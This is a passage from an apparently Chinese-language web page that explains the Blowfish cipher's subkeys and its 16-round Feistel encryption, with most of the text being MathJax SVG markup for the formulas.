22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(2667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></g></svg></mjx-container></p>
<p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.8ex;" xmlns="http://www.w3.org/2000/svg" width="22.238ex" height="2.395ex" role="img" focusable="false" viewBox="0 -705 9829.2 1058.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2149.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2594.5,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(4744.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(5189,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(6527.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6972.3,0)"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="TeXAtom" transform="translate(646,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(1167,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(2667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></g></g></svg></mjx-container></p>
<p>子密钥的生成和使用将在下面详细介绍。</p>
<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>Blowfish调用16轮Feistel函数进行加密操作，操作流程如下图。</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20220228160904.png" style="zoom:50%;">

<ol>
<li><p>  输入内容是一个64bits的数据块<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="3.466ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 1531.8 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，将其均分为高低两部分<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.151ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1392.5 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex;" xmlns="http://www.w3.org/2000/svg" width="3.275ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1447.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g></svg></mjx-container>，均为32bits，每一轮将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.151ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1392.5 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mi" transform="translate(861,-150) scale(0.707)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex;" xmlns="http://www.w3.org/2000/svg" width="2.362ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 1043.9 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>异或，结果设为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="3.95ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1746.1 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="TeXAtom" transform="translate(861,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mn" transform="translate(681,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container>，将其调用<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.695ex" height="1.538ex" role="img" focusable="false" viewBox="0 -680 749 680"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D439" d="M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z"></path></g></g></g></svg></mjx-container>函数后得出的结果与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.373ex;" xmlns="http://www.w3.org/2000/svg" width="3.275ex" height="1.918ex" role="img" focusable="false" viewBox="0 -683 1447.7 847.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g 